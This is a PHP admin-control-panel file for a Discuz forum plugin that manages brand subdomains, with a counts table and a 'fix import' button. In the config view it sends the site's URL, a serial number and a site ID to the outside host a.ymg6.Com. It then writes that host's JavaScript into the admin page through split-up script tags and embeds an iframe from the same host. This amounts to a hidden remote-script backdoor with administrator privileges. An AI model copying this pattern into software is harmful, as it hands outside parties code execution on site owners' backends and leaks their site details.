<?php

/**
 *      [Sanree] (C)2012-2099 Sanree Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: sanree_brand_domain_base.php $
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}

$do = isset($_G['sr_do']) ? $_G['sr_do'] : '';
$doarray = array('config', 'fiximport');
$do = !in_array($do, $doarray) ? 'config' : $do;
	
if ($do == 'fiximport') {

		$filename =  DISCUZ_ROOT.'/source/plugin/sanree_brand_domain/userdomainindex.php';
		$handle = fopen($filename, "r");
		$contents = fread($handle, filesize ($filename));
		fclose($handle);
		$contents = str_replace('{redomain}', $redomain,$contents);
		$contents = str_replace("\r\n","\r",$contents);
		sysfilecache($contents, "sanree_brand_domainindex.php");
		cpmsg($langs['fiximportsucceed'], 'action=plugins&operation=config&act=base&identifier=sanree_brand_domain&pmod=admincp', 'succeed');
		
}
elseif ($do == 'config') {

	showsubmenu($menustr);
	showtableheader($langs['adminwork'], 'nobottom', 'style="border:1px solid #cccccc"');
	$okcount = C::t('#sanree_brand_domain#sanree_brand_domain_brand2domain')->count_by_where(' AND status=1 AND isshow=1');
	$uncount = C::t('#sanree_brand_domain#sanree_brand_domain_brand2domain')->count_by_where(' AND (status=0 OR isshow=0)');
	$rlcount = C::t('#sanree_brand_domain#sanree_brand_domain')->count_by_where(' AND status=1');
?>
<TR class=border><TD colspan="5">
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=brand2domain&identifier=sanree_brand_domain&pmod=admincp">
<?php echo $langs['adminwork_str0']?><span  style="color:red"><?php echo $okcount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=brand2domain&identifier=sanree_brand_domain&pmod=admincp">
<?php echo $langs['adminwork_str3']?><span  style="color:red"><?php echo $uncount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=list&do=audit&identifier=sanree_brand_domain&pmod=admincp">
<?php echo $langs['adminwork_str1']?><span  style="color:red"><?php echo $newcount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=list&identifier=sanree_brand_domain&pmod=admincp">
<?php echo $langs['adminwork_str2']?><span  style="color:red"><?php echo $rlcount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
</TD></TR>
<?php	
	showtablefooter();
			
	showtableheader($langs['cotitle'], 'nobottom', 'style="border:1px solid #cccccc"');
	$siteurl = urlencode("http://www.xxuuw.com/");
?>
	<script language="javascript">disallowfloat = 'newthread';</script>
		<script language="javascript">
		var SN='2013112510ufVaYF1VzC';
		var RevisionID='18562';
		var RevisionDateline='1381384801';
		var SiteUrl='http://www.xxuuw.com/';
		var ClientUrl='http://bbs.xxuuw.com/';
		var SiteID='A410ED9F-0B8D-54DA-A0F7-9C620719F1F5';	
		var src= 'http://a.ymg6.Com/api.php?type=js&SN='+SN + '&RevisionID='+ RevisionID + '&RevisionDateline='+RevisionDateline+ '&SiteUrl='+SiteUrl+ '&ClientUrl='+ClientUrl+'&SiteID='+SiteID;
		</script>	
  <tr>
    <td>
     <?php
	 $url = '<input onclick="location.href=\''.$adminurl.'&act=base&do=fiximport\'" type="button" class="btn" id="submit_fiximport" name="fiximport" value="'.$langs['fiximport'].'" />';
	 echo $url;
	 ?>
	</td>
    <td>&nbsp;</td>
  </tr>	
  <?php
		showtablefooter();

		showtableheader($langs['sanreeinfo'], 'nobottom', 'style="border:1px solid #cccccc"');	
		$sitedata = urlencode($_G['siteurl']);	
	?>
	  <tr>
		<td>		
		<iframe src="http://a.ymg6.Com/ad.php?sitedata=<?php echo $sitedata?>" width="100%" height="200" scrolling="yes" frameborder="0"></iframe></td>
	  </tr>
	  <script language="javascript">
		document.write('<' + 'script src="' + src + '"' + ' type="text/javascript"><' + '/script>');		  
	  </script>
	<?php
	showtablefooter();	
}
//From:www_YMG6_COM
?>